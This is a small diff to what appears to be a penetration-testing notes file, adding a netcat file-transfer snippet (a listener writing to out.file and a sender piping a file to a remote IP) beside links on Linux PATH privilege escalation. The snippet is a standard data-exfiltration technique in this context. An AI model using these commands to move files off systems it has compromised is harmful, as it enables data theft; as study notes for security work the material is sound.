@@ -174,4 +174,9 @@ More information regarding abusing PATH
 https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
 
 ### [Transferring files using netcat]
+```
+nc -l -p <port> > out.file
+
+nc -w 3 <IP> 1234 < out.file
+```
 https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/
